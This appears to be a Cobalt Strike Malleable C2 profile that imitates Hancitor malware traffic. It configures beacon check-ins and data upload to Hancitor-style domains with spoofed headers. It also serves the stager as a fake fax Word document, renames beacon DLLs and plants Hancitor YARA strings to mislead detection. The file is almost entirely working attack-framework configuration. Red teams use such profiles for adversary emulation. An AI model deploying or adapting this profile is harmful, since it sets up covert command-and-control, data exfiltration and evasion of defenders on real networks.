#hancitor
#taken from --> http://www.malware-traffic-analysis.net/2017/12/20/index.html
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/mlu/forum.php";
    
    client {

        header "Host" "arrepsinrab.com";
	header "Accept" "*/*";
	header "Accept-Encoding" "identity, *;q=0";
	header "Accept-Language" "en-US";
	header "Content-Type" "application/octet-stream";
        header "Connection" "close";
	header "Content-Encoding" "binary";
	
        
        metadata {
            netbios;
            header "Cookie";


        }


    }

    server {

        header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html";
	header "Keep-Alive" "timeout=2, max=100";
	header "Connection" "close";
	header "X-Powered-By" "PHP/5.4.45";
        

        output {
            netbios;
            print;
        }
    }
}

http-post {
    
    set uri "/ls5/forum.php";

    client {
       
	header "Accept" "*/*";
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Host" "gedidnundno.com";
	header "Cache-Control" "no-cache";
        
        output {
            netbios;
	    print;

        }
        
  	     
        id {
            netbiosu;
	    header "GUID";

        }
    }

    server {

	header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html";
	header "Transfer-Encoding" "chunked";
	header "Connection" "keep-alive";
	header "X-Powered-By" "PHP/5.4.45";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/lS5/forum.php";
	set uri_x64 "/ls5/Forum.php";

    client {
	header "Accept" "text/html, application/xhtml+xml, */*";
	header "Accept-Language" "en-US";
	header "Host" "acamonitoringltd.ca";
	header "Connection" "Keep-Alive";
    }

    server {
        header "Server" "nginx";
	header "Content-Type" "application/msword;";
	header "Keep-Alive" "timeout=2, max=100";
	header "Connection" "Keep-Alive";
	header "X-Powered-By" "PHP/5.3.3";
	header "Content-Disposition" "attachment; filename=fax_286509.doc";
	header "Pragma" "private";
    
    }


}

stage {
	#random
	set compile_time "15 Nov 2017 12:24:14";
	set userwx "false";
	set image_size_x86 "301000";

	#https://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html
	transform-x86 {
		strrep "beacon.dll" "pm.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "PM.dll";
	}	

	#https://github.com/Yara-Rules/rules/blob/d1da9c002d1d00045f53ea1502cfcc7dd43c115e/Malicious_Documents/Maldoc_hancitor_dropper
	stringw "{ 00 56 69 72 74 75 61 6C 41 6C 6C 6F 63 00 }";
	stringw "{ 00 52 74 6C 4D 6F 76 65 4D 65 6D 6F 72 79 00 }";
	stringw "{ 00 43 61 6C 6C 57 69 6E 64 6F 77 50 72 6F 63 41 00 }";
	stringw "{ 50 4F 4C 41 }";

}
